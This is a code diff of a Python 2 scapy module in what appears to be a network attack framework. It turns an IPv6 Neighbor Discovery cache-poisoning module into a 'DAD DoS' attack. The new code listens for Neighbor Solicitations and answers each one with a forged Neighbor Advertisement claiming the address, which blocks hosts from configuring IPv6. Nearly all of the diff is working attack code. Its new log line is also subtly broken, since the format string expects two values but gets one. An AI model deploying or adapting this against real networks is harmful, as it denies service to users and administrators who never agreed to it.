@@ -1,7 +1,6 @@
 from scapy.all import *
 from copy import copy
 import sys
-import random
 from multiprocessing.pool import ThreadPool, Pool
 from template import Template
 
@@ -12,19 +11,19 @@ class IPv6Module(Template):
 
     def __init__(self, socketio, namespace):
         super(IPv6Module, self).__init__(socketio, namespace)
-        self.modname = "ND Cache Poisoning"
+        self.modname = "DAD DoS"
         self.actions = [
             {
-                "title": "ND Cache Poisoning",
+                "title": "DAD DoS",
                 "action": "action",
                 "target": True
             },
             {
-                "title": "ND Cache Poisoning",
+                "title": "Start DAD DoS",
                 "action": "action"
             },
             {
-                "title": "Stop ND Cache Poisoning",
+                "title": "Stop DAD DoS",
                 "action": "stop_sniffer"
             }
         ]
@@ -80,34 +79,35 @@ class IPv6Sniffer:
         res['ip'] = packet[IPv6].src
         channel = False
         if ICMPv6ND_NS in packet:
-            channel = 'llmnr_result'
+            channel = 'module_output'
             try:
-                self.cache_poison(packet)
+                self.DAD_DoS(packet)
             except Exception,e:
                 exc_info = sys.exc_info()
                 traceback.print_exception(*exc_info)
                 #print e
 
-    def cache_poison(self, packet,target=None, src=None, dst=get_source_address(IPv6(dst="ff02::1"))):
-        M = 16**4
-        src = "fe80:" + ":".join(("%x" % random.randint(0, M) for i in range(6)))
-        lladdr = getMacAddress(src)
-
+    def DAD_DoS(self, packet,target=None, src=None, dst=get_source_address(IPv6(dst="ff02::1"))):
         ip_packet = createIPv6()
         ip_packet.fields["nh"] = 58 #ICMPv6
         ip_packet.fields["hlim"] = 255
-        ip_packet.fields["src"] = src
         ip_packet.fields["dst"] = dst
+
+        if packet[IPv6].src != "::":
+            ip_packet.fields["dst"] = packet[IPv6].src
+
 
         tgt = packet[ICMPv6ND_NS].fields["tgt"]
 
-        solicitation = ICMPv6ND_NS()
-        solicitation.fields["tgt"] = src
+        advertisement = ICMPv6ND_NA()
+        advertisement.fields["R"] = 0
+        advertisement.fields["S"] = 1
+        advertisement.fields["O"] = 1
         
         options = ICMPv6NDOptSrcLLAddr()
-        options.fields["lladdr"] = lladdr
+        options.fields["lladdr"] = [get_if_hwaddr(i) for i in get_if_list()][0]
 
-        # TODO: Add continuous sending of this packet
-        send(ip_packet/solicitation/options)
+        send(ip_packet/advertisement/options)
+        out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s  Packet sent to %s" % (tgt)
         self.mod.socket_log(out)
         print out
